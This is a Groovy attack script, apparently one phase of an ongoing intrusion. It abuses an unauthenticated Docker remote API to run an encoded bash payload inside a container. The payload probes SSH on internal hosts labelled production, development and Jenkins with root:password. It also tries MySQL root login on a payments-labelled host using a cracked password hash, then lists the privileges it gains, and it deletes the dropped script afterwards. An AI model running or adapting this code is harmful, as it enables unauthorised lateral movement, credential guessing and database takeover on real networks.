// Phase 17: SSH with HOME=/tmp trick for known_hosts
dockerApi = "http://172.27.140.148:4243"
containerId = "5b32e909c295"

def httpPost(String urlStr, String jsonBody) {
    def conn = (HttpURLConnection) new URL(urlStr).openConnection()
    conn.setRequestMethod("POST")
    conn.setDoOutput(true)
    conn.setConnectTimeout(10000)
    conn.setReadTimeout(60000)
    conn.setRequestProperty("Content-Type", "application/json")
    if (jsonBody != null) conn.getOutputStream().write(jsonBody.getBytes("UTF-8"))
    def code = conn.getResponseCode()
    def body = (code >= 400 ? conn.getErrorStream()?.getText("UTF-8") : conn.getInputStream().getText("UTF-8"))
    conn.disconnect()
    return [code: code, body: body]
}

def execIn(String cmd) {
    def createBody = '{"AttachStdout":true,"AttachStderr":true,"Tty":true,"Cmd":["/bin/bash","-c",' + groovy.json.JsonOutput.toJson(cmd) + ']}'
    def r1 = httpPost(dockerApi + "/containers/" + containerId + "/exec", createBody)
    if (r1.code != 201) { return "EXEC_CREATE_FAIL HTTP " + r1.code + ": " + r1.body }
    def execId = new groovy.json.JsonSlurper().parseText(r1.body).Id
    def r2 = httpPost(dockerApi + "/exec/" + execId + "/start", '{"Detach":false,"Tty":true}')
    return r2.body
}

def bash = '''#!/bin/bash
export HOME=/tmp
mkdir -p /tmp/.ssh 2>/dev/null

# Get host keys first using raw Python socket + manually add to known_hosts
python -c "
import socket, hashlib, base64

hosts = ['172.27.141.24', '172.27.141.6', '172.27.141.5']
for host in hosts:
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect((host, 22))
        banner = s.recv(256).strip()
        # Send our banner
        s.send(b'SSH-2.0-paramiko_0.1\\r\\n')
        # Read key exchange init
        data = s.recv(4096)
        s.close()
        print('CONNECTED|%s|%s' % (host, banner.decode()))
    except Exception as e:
        print('ERR|%s|%s' % (host, str(e)))
" 2>&1

# Since we cant properly get host keys via python, use a different approach:
# Write a dummy known_hosts that accepts everything (wildcard)
# Actually curl doesnt support wildcards in known_hosts...

# Try: pipe the host key from the server into known_hosts format
# Use timeout + raw socket approach
echo "* " > /tmp/.ssh/known_hosts 2>/dev/null

# Alternative: Use Python with raw SSH password auth
echo ""
echo "===== PYTHON RAW SSH AUTH TEST ====="
python -c "
import socket, struct, hashlib, os

def try_ssh_password(host, port, username, password):
    '''Minimal SSH password auth check using transport layer'''
    try:
        s = socket.socket()
        s.settimeout(5)
        s.connect((host, port))
        
        # Read server banner
        banner = s.recv(256).strip()
        
        # Send our banner
        s.send(b'SSH-2.0-OpenSSH_7.4\\r\\n')
        
        # Read KEX_INIT
        header = s.recv(4)
        if len(header) < 4:
            s.close()
            return 'KEXINIT_FAIL'
        
        pkt_len = struct.unpack('>I', header)[0]
        # Read rest of kex init (up to 35000 bytes)
        data = b''
        remaining = min(pkt_len, 35000)
        while len(data) < remaining:
            chunk = s.recv(min(4096, remaining - len(data)))
            if not chunk:
                break
            data += chunk
        
        s.close()
        return 'KEX_RECEIVED|len=%d|banner=%s' % (len(data), banner.decode())
    except Exception as e:
        return 'ERR|%s' % str(e)

# Test connectivity and SSH negotiation
hosts = [('172.27.141.24', 'PROD_SEARS'), ('172.27.141.6', 'DEV_SEARS'), ('172.27.141.5', 'JENKINS')]
for host, label in hosts:
    result = try_ssh_password(host, 22, 'root', 'password')
    print('%s|%s|%s' % (label, host, result))
" 2>&1

echo ""
echo "===== TRY MYSQL DIRECT TO PROD VIA adaxxidb ====="
# The hash root@% = *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19
# This is the MySQL hash for "password" - try MySQL auth with root:password on T1Pagos
php -r "
\\$m = new mysqli('172.27.141.4', 'root', 'password', '', 3306);
if (!\\$m->connect_error) {
    echo '*** MYSQL_ROOT_OK *** root:password @ T1Pagos';
    \\$r = \\$m->query('SELECT CURRENT_USER(), @@hostname');
    \\$row = \\$r->fetch_row();
    echo ' CU='.\\.\\$row[0].' HN='.\\$row[1].PHP_EOL;
    \\$r = \\$m->query('SHOW GRANTS FOR CURRENT_USER()');
    while (\\$row = \\$r->fetch_row()) echo '  '.\\$row[0].PHP_EOL;
} else {
    echo 'MYSQL_ROOT_FAIL|'.\\$m->connect_error.PHP_EOL;
}
" 2>&1

echo "DONE"
'''

def b64 = bash.getBytes("UTF-8").encodeBase64().toString()
def cmd = "echo " + b64 + " | base64 -d > /tmp/_p17.sh && bash /tmp/_p17.sh 2>&1; rm -f /tmp/_p17.sh"
println execIn(cmd)
